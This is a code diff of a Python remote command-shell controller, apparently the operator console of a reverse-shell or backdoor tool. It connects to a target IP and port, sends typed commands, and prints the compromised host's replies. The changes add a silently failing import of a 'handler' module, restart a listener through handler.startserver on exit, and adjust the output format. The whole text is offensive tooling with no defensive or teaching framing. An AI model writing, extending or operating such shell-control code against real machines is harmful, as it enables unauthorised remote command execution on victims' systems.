@@ -4,6 +4,10 @@
 # @Author    :D0WE1L1N
 import socket
 import sys
+try:
+    import handler
+except:
+    pass
 def start(ip, port):
     if port == "":
         port = 8625
@@ -29,13 +33,15 @@ def start(ip, port):
             cmd_SessObj.send(bytes(cmd_command, 'utf8'))
             if cmd_command == "exit":
                 print("CMD_SHELL>[*]exiting......")
+                handler.startserver(ip, port, False)
                 break
             CMD_re = cmd_SessObj.recv(1024)
             try:
-                print("CMD>" + str(ip) + CMD_re.decode('utf-8'))
+                print(str(ip) + ">"+ CMD_re.decode('utf-8'))
             except:
-                print("CMD>" + str(ip) + CMD_re.decode('gbk'))
+                print(str(ip) + ">" + CMD_re.decode('gbk'))
         cmd_SessObj.close()
+        break
     cmd_session.close()
     
 if __name__ == "__main__":
